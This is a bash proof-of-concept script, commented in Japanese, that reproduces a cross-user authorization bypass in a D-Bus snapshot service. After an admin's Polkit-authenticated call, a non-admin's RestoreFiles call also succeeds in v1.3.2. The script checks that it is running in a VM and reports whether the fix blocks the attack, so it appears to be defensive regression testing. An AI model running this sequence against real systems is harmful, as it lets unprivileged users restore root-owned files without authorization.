#!/bin/bash
# poc_cross_user.sh - Issue #4a: m_authenticated クロスユーザー汚染
#
# シナリオ:
#   1. alice (admin) が CreateSnapshot を呼び、Polkit認証を成立させる
#      → v1.3.2 では m_authenticated が true になる
#   2. その直後、bob (non-admin) が RestoreFiles 等を呼ぶ
#      → v1.3.2 では m_authenticated=true の影響で通過する
#   3. 修正版 (P0-2) では m_authenticated が撤去され、bob側は常に拒否される
#
# 事前準備: alice, bob が存在し、alice が wheel/polkit_admin に属する。
#           対話的認証を避けるため、alice は pkexec でパスワード入力済みの
#           セッションを別端末で確立した状態で実行するか、
#           expect スクリプトで自動化する。

set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

ALICE="${ALICE_USER:-alice}"
BOB="${BOB_USER:-bob}"

if ! id "$ALICE" >/dev/null 2>&1 || ! id "$BOB" >/dev/null 2>&1; then
    log "ERROR: users $ALICE / $BOB not present"
    exit 2
fi

# Step 1: alice で認証を成立させる (要: 事前にsudo authedまたは自動応答設定)
log "Step 1: alice triggers authenticated call"
# TODO: 対話的認証の自動化は環境依存。ここでは pkttyagent を想定するか、
#       テストVMで alice のポリシーを一時的に allow_active=yes に緩和する。
sudo -u "$ALICE" dbus-send --system --print-reply \
    --dest="$DBUS_SERVICE" "$DBUS_PATH" \
    "${DBUS_IFACE}.CreateSnapshot" \
    string:"root" string:"single" string:"cross-user-test" \
    int32:0 string:"" dict:string:string:"" boolean:false \
    > "$RESULT_DIR/${MODE}_cross_user_alice.log" 2>&1 &
ALICE_PID=$!
sleep 0.5

# Step 2: bob が RestoreFiles を叩く (通常ならnot authorized)
log "Step 2: bob attempts RestoreFiles while alice session is hot"
SNAP_ID=$(ensure_snapshot root)
OUTPUT=$(sudo -u "$BOB" dbus-send --system --print-reply \
    --dest="$DBUS_SERVICE" "$DBUS_PATH" \
    "${DBUS_IFACE}.RestoreFiles" \
    string:"root" int32:"$SNAP_ID" \
    array:string:"/.snapshots/$SNAP_ID/snapshot/etc/hostname" \
    array:string:"c" 2>&1 || true)

wait "$ALICE_PID" 2>/dev/null || true

log "bob outcome: $OUTPUT"
if echo "$OUTPUT" | grep -qE "Error.*(AccessDenied|NotAuthorized)"; then
    report_result blocked
else
    report_result reproduced
fi
